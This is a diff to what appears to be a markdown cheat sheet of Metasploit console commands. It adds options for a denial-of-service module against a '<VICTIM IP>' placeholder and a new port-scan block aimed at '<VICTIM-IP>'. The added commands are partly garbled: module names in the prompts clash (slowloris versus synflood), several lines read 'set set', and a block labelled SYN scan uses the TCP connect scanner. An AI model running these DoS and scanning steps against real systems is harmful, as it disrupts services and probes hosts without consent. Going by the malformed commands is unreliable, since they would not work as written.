@@ -113,6 +113,8 @@ msf6 auxiliary(dos/http/slowloris) > set rhost <VICTIM IP>
 rhost => <VICTIM IP>
 msf6 auxiliary(dos/tcp/synflood) > set rport <SERVER RUNNING PORT>
 rport => <SERVER RUNNING PORT>
+msf6 auxiliary(dos/tcp/synflood) > set sockets 500
+msf6 auxiliary(dos/tcp/synflood) > set delay 1
 msf6 auxiliary(dos/http/slowloris) > run
 ```
 
@@ -202,6 +204,18 @@ run
     msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <VICTIM-IP>
     msf6 auxiliary(scanner/portscan/tcp) > run
 ``` 
+
+**PORTSCAN SYN**
+```shell
+    msfconsole
+    msf6> use auxiliary/scanner/portscan/tcp
+    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <VICTIM-IP>
+    msf6 auxiliary(scanner/portscan/tcp) > set set THREADS 10
+    msf6 auxiliary(scanner/portscan/tcp) > set set BATCHSIZE 512
+    msf6 auxiliary(scanner/portscan/tcp) > set set TIMEOUT 100
+    msf6 auxiliary(scanner/portscan/tcp) > run
+``` 
+
 
 ### Why PORTS are fixed and shouldnt be change if necessary?
 
